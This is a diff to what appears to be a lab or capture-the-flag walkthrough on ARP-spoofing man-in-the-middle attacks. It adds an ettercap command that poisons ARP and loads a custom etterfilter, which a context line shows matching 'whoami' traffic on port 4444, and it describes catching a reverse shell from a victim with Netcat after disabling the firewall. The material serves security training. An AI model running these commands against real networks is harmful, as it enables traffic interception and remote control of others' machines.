@@ -847,8 +847,11 @@ if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
     
         - `ufw disable`
     
-    Now, run ettercap specifying your newly created etterfilter file:
-    -  
+    - Now, run ettercap specifying your newly created etterfilter file:
+    
+        - `ettercap -T -i eth1 -M arp -F whoami.ef`
+
+- A few seconds after executing this command, you should see the "###### ETTERFILTER: …" message and/or "Connection received on 192.168.12.20 …"  in your Netcat output, which means you've just caught a reverse shell from Bob! Now, you can quit ettercap (with q), foreground your Netcat listener (with fg), and enjoy your shell!
 
 ---
 
